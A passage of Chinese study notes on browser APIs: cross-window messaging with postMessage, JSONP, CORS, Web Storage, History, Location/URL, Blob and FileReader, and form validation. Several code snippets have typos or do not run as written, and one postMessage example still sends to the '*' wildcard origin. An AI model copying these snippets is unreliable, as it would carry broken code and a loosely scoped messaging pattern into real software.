上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。

子窗口通过监听`hashchange`事件得到通知。

```
window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
```

同样的，子窗口也可以改变父窗口的片段标识符。

```
parent.location.href = target + '#' + hash;
```



**window.postMessage()**

上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。

这个 API 为`window`对象新增了一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口`aaa.com`向子窗口`bbb.com`发消息，调用`postMessage`方法就可以了。

```js
// 父窗口打开一个子窗口
var popup = window.open('http://bbb.com', 'title');
// 父窗口向子窗口发消息
popup.postMessage('Hello World!', 'http://bbb.com');
```

`postMessage`方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为`*`，表示不限制域名，向所有窗口发送。

子窗口向父窗口发送消息的写法类似。

```js
// 子窗口向父窗口发消息
window.opener.postMessage('Nice to see you', 'http://aaa.com');
```

父窗口和子窗口都可以通过`message`事件，监听对方的消息。

```js
// 父窗口和子窗口都可以用下面的代码，
// 监听 message 消息
window.addEventListener('message', function (e) {
  console.log(e.data);
},false);
```

`message`事件的参数是事件对象`event`，提供以下三个属性。

> - `event.source`：发送消息的窗口
> - `event.origin`: 消息发向的网址
> - `event.data`: 消息内容

下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。

```js
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  event.source.postMessage('Nice to see you!', '*');
}
```

上面代码有几个地方需要注意。首先，`receiveMessage`函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，`postMessage`方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。

`event.origin`属性可以过滤不是发给本窗口的消息。

```
window.addEventListener('message', receiveMessage);
function receiveMessage(event) {
  if (event.origin !== 'http://aaa.com') return;
  if (event.data === 'Hello World') {
    event.source.postMessage('Hello', event.origin);
  } else {
    console.log(event.data);
  }
}
```

**LocalStorage**

通过`window.postMessage`，读写其他窗口的 LocalStorage 也成为了可能。

下面是一个例子，主窗口写入 iframe 子窗口的`localStorage`。

```
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
```

上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。

父窗口发送消息的代码如下。

```
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
win.postMessage(
  JSON.stringify({key: 'storage', data: obj}),
  'http://bbb.com'
);
```

加强版的子窗口接收消息的代码如下。

```
window.onmessage = function(e) {
  if (e.origin !== 'http://bbb.com') return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case 'set':
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case 'get':
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, 'http://aaa.com');
      break;
    case 'remove':
      localStorage.removeItem(payload.key);
      break;
  }
};
```

加强版的父窗口发送消息代码如下。

```
var win = document.getElementsByTagName('iframe')[0].contentWindow;
var obj = { name: 'Jack' };
// 存入对象
win.postMessage(
  JSON.stringify({key: 'storage', method: 'set', data: obj}),
  'http://bbb.com'
);
// 读取对象
win.postMessage(
  JSON.stringify({key: 'storage', method: "get"}),
  "*"
);
window.onmessage = function(e) {
  if (e.origin != 'http://aaa.com') return;
  console.log(JSON.parse(e.data).name);
};
```

#### Ajax 处理跨域

服务器端处理：架设代理服务器：浏览器访问同源服务器，服务器请求外部服务。还有三种方法：JSONP，websocket， CORS。

##### 1、JSONP

JSONP 简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。

它的做法如下。

第一步，网页添加一个`<script>`元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。

```html
<script src="http://api.foo.com?callback=bar"></script>
```

注意，请求的脚本网址有一个`callback`参数（`?callback=bar`），用来告诉服务器，客户端的回调函数名称（`bar`）。

第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（`bar({...})`）。

第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是`<script>`标签请求的脚本内容。这时，客户端只要定义了`bar()`函数，就能在该函数体内，拿到服务器返回的 JSON 数据。

下面看一个实例。首先，网页动态插入`<script>`元素，由它向跨域网址发出请求。

```js
function addScriptTag(src) {
  var script = document.createElement('script');
  script.setAttribute('type', 'text/javascript');
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag('http://example.com/ip?callback=foo');
}

function foo(data) {
  console.log('Your public IP address is: ' + data.ip);
};
```

上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。注意，该请求的查询字符串有一个`callback`参数，用来指定回调函数的名字，这对于 JSONP 是必需的。

服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。

```
foo({
  'ip': '8.8.8.8'
});
```

由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了`foo`函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。

##### 2、WebSocket

WebSocket 是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

下面是一个例子，浏览器发出的 WebSocket 请求的头信息。

```txt
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13

Origin: http://example.com
```

上面代码中，有一个字段是`Origin`，表示该请求的请求源（origin），即发自哪个域名。

正是因为有了`Origin`这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
```

##### 3、CORS

### 10.8 CORS

#### CORS概述

CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写，它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发`GET`请求，CORS 允许任何类型的请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。

兼容：CORS 需要浏览器和服务器同时支持，目前浏览器都支持。对于前端开发，CORS和AJAX差不多，如果发出的请求是跨域的，那么在请求头更改信息，用户体验良好。后端开发需要在服务器实现CORS API。

分类：简单请求和非简单请求

简单请求：请求方法（get-post-head）和请求头信息简单，请求头只能是下面的属性。简单请求类似于表单请求，浏览器允许表单请求跨域。

```js
Accept
Accept-Language
Content-Language
Last-Event-ID
Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain
```

#### 简单请求

浏览器发现请求跨域，需要在请求头中加入 Origin: https://demo.seafile.com 字段，包括当前请求的协议域名端口号；服务器判断这个origin在许可的范围内，在相应头中添加 Access-Control-Allow-Origin 字段，实现跨域；如果这个origin不在许可范围内，就返回正常的HTTP回应，不包含 Access-Control-Allow-Origin 字段，此时前端xhr.onerror 会捕获到这个错误。下面是正确的字符说明

~~~js
// 服务器的响应头
Access-Control-Allow-Origin: http://api.bob.com // 必选参数，返回值是origin的参数，或者是*，表示接受任意域名的请求
Access-Control-Allow-Credentials: true // 可选参数：这个值表示是否发送cookie，只能设置为true，不设置就表示false（默认浏览器cookie不包括在CORS请求中）
Access-Control-Expose-Headers: FooBar // 可选参数：JS脚本默认可以获取部分响应头信息，这里加上这个属性，表示可以获取这个信息：getResponseHeader('FooBar') 
Content-Type: text/html; charset=utf-8
~~~

默认CORS请求不包含 cookie，为了避免CSRF风险。如果需要发送cookie，前端需要设置 xhr.withCredentials = true; 服务器会返回 Access-Control-Allow-Credentials: true，实现跨域。

如果服务器要求浏览器发送 Cookie，`Access-Control-Allow-Origin`就不能设为星号，必须指定明确的、与请求网页一致的域名。

#### 非简单请求

非简单请求：请求的方法特殊（PUT DELETE）请求头的字段特殊（Content-Type: 'application/json'）

第一步 预检请求（preflight）

在通信开始前，发送一个预检请求，浏览器询问服务器当前网页所在域名是否在服务器的许可列表中，哪些请求方法和请求头字段是允许的。服务器响应同意后，浏览器可以继续发送请求。如果不同意就不能发送；这样避免了服务器收到大量跨域的PUT delete请求。下面是一个预检请求的请求头：

~~~bash
OPTIONS /cors HTTP/1.1 预检请求的方法是 OPTIONS
Origin: http://api.bob.com 源是网页的网址
Access-Control-Request-Method: PUT 这是可以接受的请求方法
Access-Control-Request-Headers: X-Custom-Header 这里是自定义的请求头字段
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
~~~

第二步 服务器响应

服务器收到预检请求，允许跨域，做出回应，响应头如下

~~~
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com 这里表示当前网页可以跨域
Access-Control-Allow-Methods: GET, POST, PUT 这里是可以跨域的方法
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
~~~

如果不允许跨域，onerror 会捕获错误

~~~
XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
~~~

第三步 浏览器正常的请求

浏览器自动添加Origin字段，发送正常的请求



### 10.9 Storage

Storage API 的实例对象有两个：window.localStorage and window.sessionStorage。他们的区别是，关闭当前窗口（对话）后存储是否继续保留。保存的数据以键值对保存，实际上是一个字符串（数值参数会转化成字符串存储）。每个域名的存储不同，最小的chrome是2.5MB，也受同域限制，跨域操作会报错。

属性和方法

~~~js
1、window.localStorage.length

2、window.localStorage.setItem('key', 'value'); // 这里设置的key-value都是字符串，其他数据类型会强制转换成字符串，方法没有返回值。如果存储满了，这个方法会报错。或者直接改变属性也可以。如果已有这个key, 重新设置会覆盖原始值。
window.localStorage['key'] = value;

3、window.sessionStorage.getItem('foo') 如果不存在就返回 null

4、window.sessionStorage.removeItem('foo') 如果key不存在，方法不会报错；
5、window.sessionStorage.clear(); // return undefined
6、window.sessionStorage.key 返回一个key的伪数组，结合length可以遍历；
~~~

存储事件：当存储内容变化时，会触发storage事件。这个事件很特殊：如果一个窗口存储变化，那么当前窗口不会触发，同一个域名的其他窗口会触发这个事件（可以使用这个属性进行不同窗口的通信）

~~~js
window.addEventListener('storage', onChange);

onChange = (e) => {
  console.log(e.key); 表示变动的键名（如果是clear事件返回null）
  e.newValue
  e.oldValue
  e.url
  e.storageArea
}
~~~

localStorage 的可以参考自己总结的博客。

https://blog.csdn.net/weixin_41697143/article/details/98479748

### 10.9 History

浏览器的历史对象。JS脚本不允许获取历史地址，但是可以跳转导航。对历史对象的操作，和浏览器的前进后退按钮相同。

属性：history.length 当前历史的条数；history.state 历史堆栈顶层的属性（默认undefined）

方法：

- history.back(); history.forward(); 这里会从缓存中加载页面。
- history.go(0) 默认是0，表示刷新界面；使用加减1表示网页前进后退。
- History.pushState(state, title, url) state 表示状态对象，当popstate事件触发后，这个对象会传入回调函数。title 表示新页面标题，url 表示新的网址。这个方法会把当前的地址改成URL，history中会增加一个历史信息，但是界面不会跳转（不会刷新）这个网址不能跨域，否则报错。
- History.replaceState(state, title, url) 替换当前的历史记录为新的URL（原始历史被替换）

事件：popstate

当history对象变化时会触发这个事件：pushState() and replaceState() 不会触发这个事件，其他三个事件或者点击前进后退按钮就会触发这个事件。可以给这个事件指定回调函数。注意，页面第一次加载的时候，浏览器不会触发`popstate`事件。

### 10.10 Location, URL, URLSearchParems 对象

#### Location

Location 对象可以操作 URL，使用 window.location or document.location 可以获取Location对象。下面是常用的属性：

~~~
location.href 整个URL （如果更改，浏览器会立刻跳转到新地址，即使URL与原始相同，界面仍然会刷新）
location.origin 协议、主机名、端口 http://www.baidu.com:8080(这是只读属性)
location.protocol 协议（包括冒号） http:
location.host 主机名和端口号 www.baidu.com:8080(默认80and443端口会省略)
hostname 主机名
port 端口号

pathname 路径：从根路径开始（包括根路径）
search 查询部分：问号开始（不包括问号）
hash 哈希部分：井号开始（不包括#）
username
password 域名前面的用户名和密码 测试是undefined
~~~

更改 location.href 可以变成新的锚点('#comment')。`Location.href`属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的`Location.href`属性，导致后者的网址跳转。`Location`的其他属性都不允许跨域写入。

方法：

- location.assign(newURL) 浏览器立刻跳转到新的URL，如果不是URL会报错
- location.replace(newURL) 直接跳转到新的网页，当前的历史不会保存（可以判断是否是移动端，然后界面进行跳转）；
- location.reload(true) 重载当前窗口（刷新界面）如果传入true，表示想服务器重新请求，请求新界面不滚动；如果是false或者默认不传值，直接从缓存中加载，界面停留在当前滚动的位置。
- location.toString() 等价于 let a = location.href;

#### URL

##### 1、URL的编码和解码

URL中的汉字和特殊字符需要转码成为UTF-8编码（例如%82）请求中路径文件名需要转码

- encodeURI('http://www.example.com/q=春节') （注意是URI，不是URL）传入一个字符串，会将元字符（冒号斜杠）和语义字符之外的字符，都进行转义，这里可以传入一个完整的URL
- encodeURIComponent（filepath + name）会转码除了语义字符之外的所有字符，即元字符也会被转码。如果斜杠和冒号被转义就会出错。
- decodeURI
- decodeURIComponent 是上面两个方法的逆运算

##### 2、URL对象

URL对象是一个原生对象，a标签继承了URL对象的属性和方法（href）

~~~js
var url = new URL('http://www.example.com/index.html');
console.log(url.href);
如果参数是另一个 URL 实例，构造函数会自动读取该实例的href属性，作为实际参数。如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。
var url2 = new URL('page2.html', 'http://example.com/page1.html');
// "http://example.com/page2.html"
~~~

属性：URL实例对象的属性和Location的属性基本一致（origin只读，其他都可以修改）

方法

- URL.createObjectURL()为上传/下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了`File`对象或`Blob`对象的 URL。
- URL.revokeObjectURL()用来释放`URL.createObjectURL`方法生成的 URL 实例。它的参数就是`URL.createObjectURL`方法返回的 URL 字符串。

##### 3、URLSearchParams

URLSearchParams 用来构造、解析、处理 URL 查询部分（？后面的部分）参数可以使字符串对象数组，会对查询字符串自动编码（encode）。

~~~js
// 方法一：传入字符串
var params = new URLSearchParams('?foo=1&bar=2');
// 方法二：传入数组
var params = new URLSearchParams([['foo', 1], ['bar', 2]]);
// 方法三：传入对象
var params = new URLSearchParams({'foo' : 1 , 'bar' : 2});
~~~

浏览器向服务器发送表单数据时，可以直接使用`URLSearchParams`实例作为表单数据（POS请求的数据）。

~~~js
fetch('https://example.com/api', {
  method: 'POST',
  body: params
}).then(...)

var params = new URLSearchParams({version: 2.0});
window.location.href = location.pathname + '?' + params;
~~~

- URLSearchParams.toString() 把实例对象转化成字符串
- URLSearchParams.append('baz', 3) 追加一个查询参数。第一个为键名，第二个为键值，没有返回值。
- URLSearchParams.delete() 删除一个查询参数。
- URLSearchParams.has() 查询一个参数 返回布尔值
- URLSearchParams.set('foo', 5) 设置一个查询参数；如果没有这个参数就增加
- URLSearchParams.get() 获取某个value
- URLSearchParams.getAll() 返回全部的value数组
- URLSearchParams.sort()  按照Unicode进行排序
- URLSearchParams.keys()、URLSearchParams.values()、URLSearchParams.entries() 返回一个遍历器对象，让for...of... 循环遍历。`keys`方法返回的是键名的遍历器，`values`方法返回的是键值的遍历器，`entries`返回的是键值对的遍历器。

### 10.11 ArrayBuffer, Blob

#### ArrayBuffer 对象

可以获取操作二进制数据（操作内存），主要在ES6中介绍。

~~~js
let buffer = new ArrayBuffer(8); // 构造函数创建实例对象，表示这段二进制数据占用多少个字节
buffer.byteLength; 当前对象占用的内存长度
let buffer2 = buffer.slice(0,4); 复制一部分内存
~~~

#### Blob 对象 

表示二进制文件的数据内容（图片）Binary Large Object 二进制大型对象，可以用来操作二进制文件

~~~js
构造函数
let blob = newBlob([array], options);
// 第一个参数是二进制数组，数组成员是二进制数据或者字符串，第二个可选参数是配置，type，表示数据类型

let htmlFragment = ['<span>Michael</span>'];
let blob = new Blob(htmlFragemtn, {
  type: 'text/html'
});

let obj = { foo: 'foo' };
let blob2 = new Blob([JSON.stringify(obj)], {
  type: 'application/json'
});

属性和方法
size 返回二进制文件的长度
type 返回二进制文件的类型 
blob.slice(start, end, type) 截取一部分二进制文件（可以设置类型）
~~~

下面使用Blob读取上传的文件

##### 获取文件

input type=file 的上传组件，浏览器不允许脚本直接控制value，必须用户上传。用户选好文件后，即可读取文件。文件输入input和拖拽对象dataTransfer 返回的是一个类数组，FileList，每一个item是一个File对象（File对象是Blob构造函数的特殊实例，具有 name,lastModifiedData 的属性）

~~~js
// HTML 代码如下
// <input type="file" accept="image/*" multiple onchange="fileinfo(this.files)"/>

function fileinfo(files) {
  for (let i = 0; i < files.length; i++) {
    console.log(file);
  }
}
~~~

##### 下载文件

在AJAX请求中，如果设置responseType = blob 下载的结果就是Blob对象

~~~js
let xhr = new XMLHttpRequest();
xhr.open('GET', null);
xhr.responseType = 'blob';
xhr.onload = () => {
  console.log(xhr.response);
}
xhr.send(null);
~~~

##### 生成URL

浏览器允许使用`URL.createObjectURL()`方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。

~~~js
var droptarget = document.getElementById('droptarget');
droptarget.ondrop = (e) => {
  let files = e.dataTransfer.files;
  for (let i = 0; i < files.length; i++) {
    let type = files[i].type;
    if (type.substring(0, 6) !== 'images/') {
      continue;
    }
    let img = document.createElement('img');
    img.src = URL.createObjectURL(files[i]);
    img.onload = () => {
      this.width = 100;
      document.body.appendChild(this);
      URL.revokeObjectURL(this.src);
    }
  }
}
~~~

##### 读取文件

取得 Blob 对象以后，可以通过`FileReader`对象，读取 Blob 对象的内容，即文件内容。

FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。

- `FileReader.readAsText()`：返回文本，需要指定文本编码，默认为 UTF-8。
- `FileReader.readAsArrayBuffer()`：返回 ArrayBuffer 对象。
- `FileReader.readAsDataURL()`：返回 Data URL。
- `FileReader.readAsBinaryString()`：返回原始的二进制字符串。



下面是`FileReader.readAsText()`方法的例子，用来读取文本文件。

```js
// HTML 代码如下
// <input type=’file' onchange='readfile(this.files[0])'></input>
// <pre id='output'></pre>

function readfile(file) {
  var reader = new FileReader();
  reader.readAsText(file);
  reader.onload = function () {
    var text = reader.result;
    var out = document.getElementById('output');
    out.innerHTML = '';
    out.appendChild(document.createTextNode(text));
  }
  reader.onerror = function(e) {
    console.log('Error', e);
  };
}
```

上面代码中，通过指定 FileReader 实例对象的`onload`监听函数，在实例的`result`属性上拿到文件内容。

下面是`FileReader.readAsArrayBuffer()`方法的例子，用于读取二进制文件。

```js
// HTML 代码如下
// <input type="file" onchange="typefile(this.files[0])"></input>

function typefile(file) {
  // 文件开头的四个字节，生成一个 Blob 对象
  var slice = file.slice(0, 4);
  var reader = new FileReader();
  // 读取这四个字节
  reader.readAsArrayBuffer(slice);
  reader.onload = function (e) {
    var buffer = reader.result;
    // 将这四个字节的内容，视作一个32位整数
    var view = new DataView(buffer);
    var magic = view.getUint32(0, false);
    // 根据文件的前四个字节，判断它的类型
    switch(magic) {
      case 0x89504E47: file.verified_type = 'image/png'; break;
      case 0x47494638: file.verified_type = 'image/gif'; break;
      case 0x25504446: file.verified_type = 'application/pdf'; break;
      case 0x504b0304: file.verified_type = 'application/zip'; break;
    }
    console.log(file.name, file.verified_type);
  };
}  
```


### 10.12 File, FileList, FileReader

File 对象：File对象是一个特殊的Blob实例，文件上传后，即可从input元素中拿到这个对象

~~~js
let file = document.getElementById('file-update').files[0];

构造函数
let file = new File(array, name, options);
array 是文件数组（可以使arraybuffer或者string，name是文件路径或者文件名，options是配置文件，type="application/json", lastModified: 时间戳）

属性和方法
file.name
file.size
file.type
file.lastModified
file.slice() 这是继承自Blob对象的方法
~~~

FileList 伪数组，每一项是一个File对象：文件输入选择或者拖拽元素节点返回的就是FileList对象。FileList.length 返回的长度表示包含文件的个数。

FileReader 对象用于读取文件对象的内容。

~~~js
let reader = new FileReader();

属性和方法
reader.error
reader.readyState(表示加载的过程0-1-2)未加载-正在加载-加载完成
reader.result 读取完成后的文件内容，可能是字符串或者arraybuffer实例

reader.onabort
reader.onerror
reader.onload
reader.onloadstart
reader.onloadend
reader.onprogress
~~~

eg

```js
// HTML 代码如下
// <input type="file" onchange="onChange(event)">
function onChange = (e) => {
  let file = e.target.files[0];
  let reader = new FileReader();
  reader.readAsText(file);
  reader.onload = (event) => {
    console.log(event.target.result);
  };
}
```

FileReader 有以下实例方法。

- FileReader.abort()：终止读取操作，`readyState`属性将变成`2`。
- FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后`result`属性将返回一个 ArrayBuffer 实例。
- FileReader.readAsBinaryString()：读取完成后，`result`属性将返回原始的二进制字符串。
- FileReader.readAsDataURL()：读取完成后，`result`属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于`<img>`元素的`src`属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀`data:*/*;base64,`从字符串里删除以后，再进行解码。
- FileReader.readAsText()：读取完成后，`result`属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。

下面是一个例子。

```js
/* HTML 代码如下
  <input type="file" onchange="previewFile()">
  <img src="" height="200">
*/

function previewFile() {
  var preview = document.querySelector('img');
  var file    = document.querySelector('input[type=file]').files[0];
  var reader  = new FileReader();

  reader.addEventListener('load', function () {
    preview.src = reader.result;
  }, false);

  if (file) {
    reader.readAsDataURL(file);
  }
}
```

上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给`<img>`元素的`src`属性，从而把图片展示出来。

### 10.13 表单/FormData

#### 表单 form

~~~html
<form action='/handling-page' method='post' id="myform">
  <div>
    <label for="name"></label>
    <input type="text" id="name" name="user_name"/>
  </div>
  <input type="submit" id="submit" name="submit_button" value="submit"/>
</form>
~~~

当点击提交时，内部的表单会以键值对（name=value）的形式提交到服务器；如果是GET的请求方法，就在URL中以查询字符串的形式（?name=Michael&password=test），请求头就是这样的。如果是POST请求，就会将这部分参数转化成Formdata进行传递。

#### FormData 对象

可以手动构造Formdara对象并发送请求

~~~js
let form = document.getElementById('myForm');
let formData = new FormData(form);

实例方法
formData.get('user_name') //
formData.getAll();
formData.set('password', '123456');
formData.append('key1', 'value1');
formData.delete('key');
formData.has(key)
formData.keys()
formData.values()
formData.entries()
~~~

#### 表单的内置验证

##### 自动校验

表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。

```html
<!-- 必填 -->
<input required>

<!-- 必须符合正则表达式 -->
<input pattern="banana|cherry">

<!-- 字符串长度必须为6个字符 -->
<input minlength="6" maxlength="6">

<!-- 数值必须在1到10之间 -->
<input type="number" min="1" max="10">

<!-- 必须填入 Email 地址 -->
<input type="email">

<!-- 必须填入 URL -->
<input type="URL">
```

如果一个控件通过验证，它就会匹配`:valid`的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配`:invalid`的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。

##### checkValidity()

手动触发表单的校验。表单元素和表单控件都有`checkValidity()`方法，用于手动触发校验。

```js
// 触发整个表单的校验
form.checkValidity()

// 触发单个表单控件的校验
formControl.checkValidity()
```

`checkValidity()`方法返回一个布尔值，`true`表示通过校验，`false`表示没有通过校验。因此，提交表单可以封装为下面的函数。

```js
function submitForm(action) {
  var form = document.getElementById('form');
  form.action = action;
  if (form.checkValidity()) {
    form.submit();
  }
}
```

##### willValidate 属性

控件元素的`willValidate`属性是一个布尔值，表示该控件是否会在提交时进行校验。

```js
// HTML 代码如下
// <form novalidate>
//   <input id="name" name="name" required />
// </form>

var input = document.querySelector('#name');
input.willValidate // true
```

##### validationMessage 属性

控件元素的`validationMessage`属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。

- 该控件不会在提交时自动校验
- 该控件满足校验条件

```js
// HTML 代码如下
// <form><input type="text" required></form>
document.querySelector('form input').validationMessage
// "请填写此字段。"
```

下面是另一个例子。

```js
var myInput = document.getElementById('myinput');
if (!myInput.checkValidity()) {
  document.getElementById('prompt').innerHTML = myInput.validationMessage;
}
```

##### setCustomValidity()

控件元素的`setCustomValidity()`方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。

如果调用这个方法，并且参数不为空字符串，浏览器就会认为控件没有通过校验，就会立刻显示该方法设置的报错信息。

```js
/* HTML 代码如下
<form>
  <p><input type="file" id="fs"></p>
  <p><input type="submit"></p>
</form>
*/

document.getElementById('fs').onchange = checkFileSize;

function checkFileSize() {
  var fs = document.getElementById('fs');
  var files = fs.files;
  if (files.length > 0) {
     if (files[0].size > 75 * 1024) {
       fs.setCustomValidity('文件不能大于 75KB');
       return;
     }
  }
  fs.setCustomValidity('');
}
```

上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。

##### validity 属性

控件元素的属性`validity`属性返回一个`ValidityState`对象，包含当前校验状态的信息。

该对象有以下属性，全部为只读属性。

- `ValidityState.badInput`：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。
- `ValidityState.customError`：布尔值，表示是否已经调用`setCustomValidity()`方法，将校验信息设置为一个非空字符串。
- `ValidityState.patternMismatch`：布尔值，表示用户输入的值是否不满足模式的要求。
- `ValidityState.rangeOverflow`：布尔值，表示用户输入的值是否大于最大范围。
- `ValidityState.rangeUnderflow`：布尔值，表示用户输入的值是否小于最小范围。
- `ValidityState.stepMismatch`：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。
- `ValidityState.tooLong`：布尔值，表示用户输入的字数超出了最长字数。
- `ValidityState.tooShort`：布尔值，表示用户输入的字符少于最短字数。
- `ValidityState.typeMismatch`：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。
- `ValidityState.valid`：布尔值，表示用户是否满足所有校验条件。
- `ValidityState.valueMissing`：布尔值，表示用户没有填入必填的值。

下面是一个例子。

```js
var input = document.getElementById('myinput');
if (input.validity.valid) {
  console.log('通过校验');
} else {
  console.log('校验失败');
}
```

下面是另外一个例子。

```js
var txt = '';
if (document.getElementById('myInput').validity.rangeOverflow) {
  txt = '数值超过上限';
}
document.getElementById('prompt').innerHTML = txt;
```

##### 表单的 novalidate 属性

表单元素的 HTML 属性`novalidate`，可以关闭浏览器的自动校验。

```html
<form novalidate></form>
```

这个属性也可以在脚本里设置。

```
form.noValidate = true;
```

如果表单元素没有设置`novalidate`属性，那么提交按钮（`<button>`或`<input>`元素）的`formnovalidate`属性也有同样的作用。

```
<form>
  <input type="submit" value="submit" formnovalidate>
</form>
```

#### enctype 属性

表单能够用四种编码，向服务器发送数据。编码格式由表单的`enctype`属性决定。

假定表单有两个字段，分别是`foo`和`baz`，其中`foo`字段的值等于`bar`，`baz`字段的值是一个分为两行的字符串。

```
The first line.
The second line.
```

下面四种格式，都可以将这个表单发送到服务器。

**（1）GET 方法**

如果表单使用`GET`方法发送数据，`enctype`属性无效。

```html
<form
  action="register.php"
  method="get"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

数据将以 URL 的查询字符串发出。

```
?foo=bar&baz=The%20first%20line.%0AThe%20second%20line.
```

**（2）application/x-www-form-urlencoded**

如果表单用`POST`方法发送数据，并省略`enctype`属性，那么数据以`application/x-www-form-urlencoded`格式发送（因为这是默认值）。

```html
<form
  action="register.php"
  method="post"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

发送的 HTTP 请求如下。

```
Content-Type: application/x-www-form-urlencoded
foo=bar&baz=The+first+line.%0D%0AThe+second+line.%0D%0A
```

上面代码中，数据体里面的`%0D%0A`代表换行符（`\r\n`）。

**（3）text/plain**

如果表单使用`POST`方法发送数据，`enctype`属性为`text/plain`，那么数据将以纯文本格式发送。

```html
<form
  action="register.php"
  method="post"
  enctype="text/plain"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

发送的 HTTP 请求如下。

```
Content-Type: text/plain

foo=bar
baz=The first line.
The second line.
```

**（4）multipart/form-data**

如果表单使用`POST`方法，`enctype`属性为`multipart/form-data`，那么数据将以混合的格式发送。

```html
<form
  action="register.php"
  method="post"
  enctype="multipart/form-data"
  onsubmit="AJAXSubmit(this); return false;"
>
</form>
```

发送的 HTTP 请求如下。

```
Content-Type: multipart/form-data; boundary=

Content-Disposition: form-data; name="foo"

bar

Content-Disposition: form-data; name="baz"

The first line.
The second line.
```

这种格式也是文件上传的格式。

#### 文件上传

用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。

```html
<input type="file" id="file" name="myFile">
```

